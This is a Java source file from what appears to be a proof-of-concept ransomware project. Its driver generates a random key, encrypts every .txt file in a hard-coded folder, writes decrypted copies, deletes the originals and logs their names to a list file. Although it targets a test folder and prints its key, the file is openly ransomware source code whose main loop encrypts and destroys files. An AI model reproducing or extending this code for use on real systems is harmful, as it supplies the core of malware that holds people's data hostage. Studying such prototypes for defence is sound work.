package ransomware;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;

import ransomware.exceptions.CryptoException;

public class UtilsDriver {
    private static String key = "";

    public static void main(String[] args) throws NoSuchAlgorithmException, IOException {
        String folderPath = "D:/Coding/POC-Ransomware/src/main/java/ransomware/testfiles/";
        File folder = new File(folderPath);
        ArrayList<File> files = new ArrayList<>(0);
        ArrayList<String> deletedFiles = new ArrayList<>(0);
        File[] fileArray = folder.listFiles();
        String alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890`~!@#$%^&*()_+-={}|[];'/.,:?><";

        for (int i = 0; i < 32; i++) {
            key += Character.toString(alphabet.charAt((int) (Math.random() * alphabet.length())));
        }

        System.out.println(key);
        
        for (File file : fileArray) {
            if (file.getName().endsWith(".txt")) {
                files.add(file);
            }
        }

        for (File inputFile : files) {
            File encryptedFile = new File(folderPath + inputFile.getName() + ".encrypted");
            File decryptedFile = new File(folderPath + inputFile.getName() + ".decrypted");
            try {
                Utils.encrypt(key, inputFile, encryptedFile);
                Utils.decrypt(key, encryptedFile, decryptedFile);
            } catch (CryptoException ex) {
                System.out.println(ex.getMessage());
                ex.printStackTrace();
            }

            deletedFiles.add(inputFile.getName());
            inputFile.delete();
        }

        File encryptedFileList = new File("D:/Coding/POC-Ransomware/src/main/java/ransomware/encryptedFiles.list");

        FileWriter fr = new FileWriter(encryptedFileList, true);
        for (String fileName : deletedFiles) {
            fr.write(fileName + "\n");
            System.out.println("Encrypted and deleted file: " + fileName );
        }
        fr.close();
    }
}